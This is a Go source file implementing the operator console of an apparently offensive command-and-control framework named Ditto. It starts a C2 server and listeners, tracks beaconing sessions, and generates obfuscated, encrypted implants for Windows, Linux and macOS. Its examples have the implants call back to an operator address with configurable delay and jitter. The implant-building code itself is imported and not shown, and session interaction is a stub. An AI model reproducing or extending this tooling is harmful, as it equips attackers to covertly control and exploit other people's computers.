package main

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/ditto/ditto/banner"
	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/jobs"
	"github.com/ditto/ditto/payload"
	"github.com/ditto/ditto/transport"
	"github.com/jedib0t/go-pretty/v6/table"
)

// InteractiveServer manages the interactive server CLI
type InteractiveServer struct {
	logger        *core.Logger
	config        *core.Config
	server        *transport.Server
	serverRunning bool
	serverMu      sync.RWMutex
	jobManager    *jobs.JobManager
	sessionMgr    *core.SessionManager
}

// NewInteractiveServer creates a new interactive server
func NewInteractiveServer(logger *core.Logger, cfg *core.Config) *InteractiveServer {
	return &InteractiveServer{
		logger:     logger,
		config:     cfg,
		jobManager: jobs.NewJobManager(),
		sessionMgr: core.NewSessionManager(),
	}
}

// Run starts the interactive server CLI
func (is *InteractiveServer) Run() {
	banner.PrintDittoBanner()
	fmt.Println("Ditto Interactive Server")
	fmt.Println("Type 'help' for available commands")
	fmt.Println()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("[ditto] > ")
		if !scanner.Scan() {
			break
		}

		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		if len(parts) == 0 {
			continue
		}

		command := parts[0]
		args := parts[1:]

		if err := is.handleCommand(command, args); err != nil {
			fmt.Printf("[!] Error: %v\n", err)
		}
	}
}

func (is *InteractiveServer) handleCommand(cmd string, args []string) error {
	switch cmd {
	case "help", "h", "?":
		is.printHelp()
	case "server", "srv", "s":
		return is.handleServer(args)
	case "stop-server", "stop":
		return is.handleStopServer()
	case "jobs", "j":
		is.printJobs()
	case "kill", "k":
		return is.handleKill(args)
	case "generate", "gen", "g":
		return is.handleGenerate(args)
	case "sessions", "sess":
		is.printSessions()
	case "use", "u":
		return is.handleUse(args)
	case "listen", "l":
		return is.handleListen(args)
	case "version", "v":
		fmt.Printf("Ditto v%s\nBuild: %s\nCommit: %s\n", version, buildTime, gitCommit)
	case "clear", "cls":
		fmt.Print("\033[H\033[2J")
		banner.PrintDittoBanner()
	case "exit", "quit", "q":
		if is.isServerRunning() {
			fmt.Println("[!] Server is running. Stop it first with 'stop-server'")
			return nil
		}
		fmt.Println("Exiting Ditto...")
		os.Exit(0)
	default:
		fmt.Printf("[!] Unknown command: %s\nType 'help' for available commands.\n", cmd)
	}
	return nil
}

func (is *InteractiveServer) printHelp() {
	help := `
Available Commands:
  Server Management:
    server, srv, s <addr>     Start C2 server (default: 0.0.0.0:8443)
    stop-server, stop          Stop the running server
    
  Jobs & Listeners:
    jobs, j                    List all active jobs/listeners
    listen, l <type> <addr>    Start a listener (http, https, mtls)
                               Example: listen http 0.0.0.0:8080
    kill, k <job_id>           Stop a job by ID
    
         Implant Generation:
           generate, gen, g           Generate implant
                                      Usage: generate <type> <os> <arch> [options]
                                      Options:
                                        --callback, -c <url>     Callback URL (http://host:port)
                                        --delay, -d <sec>        Beacon delay (default: 30)
                                        --jitter, -j <0.0-1.0>   Jitter percentage
                                        --output, -o <path>      Output file path
                                      Example: generate full windows amd64 --callback http://192.168.1.100:8443
                               
  Session Management:
    sessions, sess             List all active sessions
    use, u <session_id>       Interact with a session (coming soon)
    
  Utilities:
    version, v                 Show version information
    clear, cls                 Clear screen
    exit, quit, q              Exit Ditto
`
	fmt.Println(help)
}

func (is *InteractiveServer) handleServer(args []string) error {
	if is.isServerRunning() {
		fmt.Println("[!] Server is already running")
		return nil
	}

	listenAddr := "0.0.0.0:8443"
	if len(args) > 0 {
		listenAddr = args[0]
	}

	fmt.Printf("[*] Starting C2 server on %s...\n", listenAddr)

	is.server = transport.NewServer(is.config, is.logger)
	
	// Start server in background
	go func() {
		is.setServerRunning(true)
		if err := is.server.Start(listenAddr); err != nil {
			fmt.Printf("[!] Server error: %v\n", err)
		}
		is.setServerRunning(false)
	}()
	
	// Sync server sessions periodically
	go is.syncSessions()

	// Give server time to start
	time.Sleep(500 * time.Millisecond)
	fmt.Printf("[+] Server started on %s\n", listenAddr)
	fmt.Println("[*] Press Ctrl+C or use 'stop-server' to stop")
	
	return nil
}

func (is *InteractiveServer) handleStopServer() error {
	if !is.isServerRunning() {
		fmt.Println("[!] Server is not running")
		return nil
	}

	fmt.Println("[*] Stopping server...")
	is.setServerRunning(false)
	
	// Stop all listeners
	for _, job := range is.jobManager.ListJobs() {
		if job.Type == jobs.JobTypeListener {
			is.jobManager.StopJob(job.ID)
		}
	}
	
	fmt.Println("[+] Server stopped")
	return nil
}

func (is *InteractiveServer) handleListen(args []string) error {
	if len(args) < 2 {
		fmt.Println("[!] Usage: listen <type> <addr>")
		fmt.Println("    Types: http, https, mtls")
		fmt.Println("    Example: listen http 0.0.0.0:8080")
		return nil
	}

	listenerType := strings.ToLower(args[0])
	addr := args[1]

	jobName := fmt.Sprintf("%s listener on %s", listenerType, addr)
	
	stopFunc := func() error {
		fmt.Printf("[*] Stopping %s...\n", jobName)
		return nil
	}

	job := is.jobManager.AddJob(jobs.JobTypeListener, jobName, stopFunc)
	job.Metadata["type"] = listenerType
	job.Metadata["addr"] = addr

	fmt.Printf("[+] Started %s (Job ID: %d)\n", jobName, job.ID)
	return nil
}

func (is *InteractiveServer) handleKill(args []string) error {
	if len(args) == 0 {
		fmt.Println("[!] Usage: kill <job_id>")
		fmt.Println("    Use 'jobs' to list job IDs")
		return nil
	}

	jobID, err := strconv.ParseUint(args[0], 10, 64)
	if err != nil {
		return fmt.Errorf("invalid job ID: %s", args[0])
	}

	if err := is.jobManager.StopJob(jobID); err != nil {
		return fmt.Errorf("failed to stop job: %w", err)
	}

	fmt.Printf("[+] Stopped job %d\n", jobID)
	return nil
}

func (is *InteractiveServer) handleGenerate(args []string) error {
	if len(args) < 3 {
		fmt.Println("[!] Usage: generate <type> <os> <arch> [options]")
		fmt.Println("    Types: stager, shellcode, full")
		fmt.Println("    OS: linux, windows, darwin")
		fmt.Println("    Arch: amd64, 386, arm64")
		fmt.Println("")
		fmt.Println("    Options:")
		fmt.Println("      --output, -o <path>      Output file path")
		fmt.Println("      --callback, -c <url>     Callback URL (http://host:port or https://host:port)")
		fmt.Println("      --delay, -d <seconds>    Beacon delay in seconds (default: 30)")
		fmt.Println("      --jitter, -j <0.0-1.0>   Jitter percentage (default: 0.0)")
		fmt.Println("      --user-agent, -u <ua>    Custom user agent string")
		fmt.Println("      --protocol, -p <proto>   Protocol: http, https, mtls (default: http)")
		fmt.Println("      --no-encrypt            Disable encryption")
		fmt.Println("      --no-obfuscate          Disable obfuscation")
		fmt.Println("")
		fmt.Println("    Examples:")
		fmt.Println("      generate full windows amd64 --callback http://192.168.1.100:8443")
		fmt.Println("      generate stager windows amd64 -o /tmp/implant.exe -c https://example.com:443")
		fmt.Println("      generate full windows amd64 --callback 192.168.1.100:8443 --delay 60 --jitter 0.3")
		return nil
	}

	payloadType := args[0]
	osTarget := args[1]
	arch := args[2]
	
	// Parse flags
	var outputPath string
	var callbackURL string
	var delay int
	var jitter float64
	var userAgent string
	var protocol string
	encrypt := true
	obfuscate := true
	
	for i := 3; i < len(args); i++ {
		switch args[i] {
		case "--output", "-o":
			if i+1 < len(args) {
				outputPath = args[i+1]
				i++
			}
		case "--callback", "-c":
			if i+1 < len(args) {
				callbackURL = args[i+1]
				i++
			}
		case "--delay", "-d":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &delay)
				i++
			}
		case "--jitter", "-j":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%f", &jitter)
				i++
			}
		case "--user-agent", "-u":
			if i+1 < len(args) {
				userAgent = args[i+1]
				i++
			}
		case "--protocol", "-p":
			if i+1 < len(args) {
				protocol = args[i+1]
				i++
			}
		case "--no-encrypt":
			encrypt = false
		case "--no-obfuscate":
			obfuscate = false
		}
	}
	
	// Set default output path if not provided
	if outputPath == "" {
		outputDir := "./implants"
		os.MkdirAll(outputDir, 0755)
		
		ext := ".bin"
		if osTarget == "windows" {
			ext = ".exe"
		}
		
		outputPath = filepath.Join(outputDir, fmt.Sprintf("implant_%s_%s_%s_%d%s",
			payloadType, osTarget, arch, time.Now().Unix(), ext))
	}

	fmt.Printf("[*] Generating %s payload for %s/%s...\n", payloadType, osTarget, arch)
	if callbackURL != "" {
		fmt.Printf("[*] Callback URL: %s\n", callbackURL)
	}
	if delay > 0 {
		fmt.Printf("[*] Delay: %d seconds\n", delay)
	}
	if jitter > 0 {
		fmt.Printf("[*] Jitter: %.1f%%\n", jitter*100)
	}
	fmt.Printf("[*] Output: %s\n", outputPath)

	options := payload.Options{
		Type:        payloadType,
		Arch:        arch,
		OS:          osTarget,
		Encrypt:     encrypt,
		Obfuscate:   obfuscate,
		Config:      is.config,
		CallbackURL: callbackURL,
		Delay:       delay,
		Jitter:      jitter,
		UserAgent:   userAgent,
		Protocol:    protocol,
	}

	gen := payload.NewGenerator(is.logger)
	data, err := gen.Generate(options)
	if err != nil {
		return fmt.Errorf("generation failed: %w", err)
	}

	// Ensure output directory exists
	outputDir := filepath.Dir(outputPath)
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return fmt.Errorf("failed to create output directory: %w", err)
	}

	if err := os.WriteFile(outputPath, data, 0755); err != nil {
		return fmt.Errorf("failed to write payload: %w", err)
	}

	fmt.Printf("[+] Payload generated successfully!\n")
	fmt.Printf("[+] Size: %d bytes\n", len(data))
	fmt.Printf("[+] Saved to: %s\n", outputPath)
	
	return nil
}

func (is *InteractiveServer) printJobs() {
	jobList := is.jobManager.ListJobs()
	
	if len(jobList) == 0 {
		fmt.Println("[*] No active jobs")
		return
	}

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredBright)
	t.AppendHeader(table.Row{"ID", "Type", "Name", "Status", "Created"})

	for _, job := range jobList {
		t.AppendRow(table.Row{
			job.ID,
			job.Type,
			job.Name,
			job.Status,
			job.CreatedAt.Format("2006-01-02 15:04:05"),
		})
	}

	fmt.Println(t.Render())
}

func (is *InteractiveServer) printSessions() {
	sessionList := is.sessionMgr.ListSessions()
	
	if len(sessionList) == 0 {
		fmt.Println("[*] No active sessions")
		return
	}

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredBright)
	t.AppendHeader(table.Row{"ID", "Type", "Transport", "Remote Addr", "Connected", "Last Seen", "State"})

	for _, session := range sessionList {
		t.AppendRow(table.Row{
			shortID(session.ID),
			session.Type,
			session.Transport,
			session.RemoteAddr,
			session.ConnectedAt.Format("15:04:05"),
			session.LastSeen.Format("15:04:05"),
			session.GetState(),
		})
	}

	fmt.Println(t.Render())
}

func (is *InteractiveServer) handleUse(args []string) error {
	if len(args) == 0 {
		fmt.Println("[!] Usage: use <session_id>")
		fmt.Println("    Use 'sessions' to list session IDs")
		return nil
	}

	sessionID := args[0]
	session, ok := is.sessionMgr.GetSession(sessionID)
	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	fmt.Printf("[+] Using session %s\n", shortID(sessionID))
	fmt.Printf("    Type: %s\n", session.Type)
	fmt.Printf("    Transport: %s\n", session.Transport)
	fmt.Printf("    Remote: %s\n", session.RemoteAddr)
	fmt.Println("[*] Session interaction coming soon...")
	
	return nil
}

func (is *InteractiveServer) isServerRunning() bool {
	is.serverMu.RLock()
	defer is.serverMu.RUnlock()
	return is.serverRunning
}

func (is *InteractiveServer) setServerRunning(running bool) {
	is.serverMu.Lock()
	defer is.serverMu.Unlock()
	is.serverRunning = running
}

func shortID(id string) string {
	parts := strings.Split(id, "-")
	if len(parts) > 0 {
		if len(parts[0]) > 8 {
			return parts[0][:8]
		}
		return parts[0]
	}
	if len(id) > 8 {
		return id[:8]
	}
	return id
}

// syncSessions periodically syncs sessions from the server
func (is *InteractiveServer) syncSessions() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	
	for range ticker.C {
		if !is.isServerRunning() || is.server == nil {
			continue
		}
		
		// Sync sessions from server to session manager
		serverSessions := is.server.GetSessions()
		for id := range serverSessions {
			// Check if session exists
			if _, exists := is.sessionMgr.GetSession(id); !exists {
				// Create new session in manager
				session := core.NewSession(id, core.SessionTypeBeacon, "http")
				// Note: Session struct fields may not be directly settable
				// This is a simplified sync - full implementation would need proper setters
				is.sessionMgr.AddSession(session)
			} else {
				// Update last seen
				if session, ok := is.sessionMgr.GetSession(id); ok {
					session.UpdateLastSeen()
				}
			}
		}
	}
}

